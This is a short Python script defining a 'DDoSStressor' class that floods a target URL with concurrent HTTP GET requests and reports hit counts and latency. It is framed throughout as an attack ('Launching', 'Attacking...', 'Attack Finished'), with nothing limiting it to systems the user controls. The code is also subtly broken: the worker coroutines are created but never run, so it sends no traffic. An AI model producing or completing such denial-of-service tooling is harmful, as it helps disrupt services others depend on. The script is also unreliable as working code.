import asyncio
import aiohttp
import time
from rich.console import Console
from rich.progress import Progress

console = Console()

class DDoSStressor:
    def __init__(self, target: str, concurrency: int = 50):
        self.target = target
        self.concurrency = concurrency
        self.stats = {"success": 0, "failed": 0, "times": []}

    async def _worker(self, session, pbar, task_id):
        while not pbar.finished:
            start = time.time()
            try:
                async with session.get(self.target) as resp:
                    await resp.read()
                    self.stats["success"] += 1
            except:
                self.stats["failed"] += 1
            finally:
                self.stats["times"].append(time.time() - start)
                pbar.update(task_id, advance=1)

    async def attack(self, duration: int = 10):
        console.print(f"[bold red]🚀 Launching Stress Test on {self.target} for {duration}s...[/bold red]")
        
        async with aiohttp.ClientSession() as session:
            with Progress() as pbar:
                task_id = pbar.add_task("[red]Attacking...", total=self.concurrency * 10) # rough estimate
                
                workers = [self._worker(session, pbar, task_id) for _ in range(self.concurrency)]
                
                # Run for duration
                await asyncio.sleep(duration)
                
                # Stop workers (in a real scenario we'd use a cancel event, for now just let them finish current req)
                
        self.report()

    def report(self):
        total = self.stats["success"] + self.stats["failed"]
        avg_time = sum(self.stats["times"]) / len(self.stats["times"]) if self.stats["times"] else 0
        console.print(f"\n[bold green]Attack Finished[/bold green]")
        console.print(f"Total Requests: {total}")
        console.print(f"Success: [green]{self.stats['success']}[/green]")
        console.print(f"Failed: [red]{self.stats['failed']}[/red]")
        console.print(f"Avg Latency: {avg_time*1000:.2f}ms")
